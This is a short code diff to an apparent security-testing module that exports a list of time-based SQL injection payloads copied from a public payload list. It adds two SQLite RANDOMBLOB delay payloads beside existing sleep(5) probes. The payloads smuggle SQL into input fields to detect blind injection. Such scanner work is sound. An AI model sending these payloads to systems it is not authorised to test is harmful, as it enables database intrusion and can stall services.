@@ -1,5 +1,7 @@
 // Taken from https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/detect/Generic_TimeBased.txt
 export const SQLI_TIME = [
+  String.raw`' OR 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2)))) --`,
+  String.raw`' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2)))))) --`,
   String.raw`sleep(5)#`,
   String.raw`1 or sleep(5)#`,
   String.raw`" or sleep(5)#`,
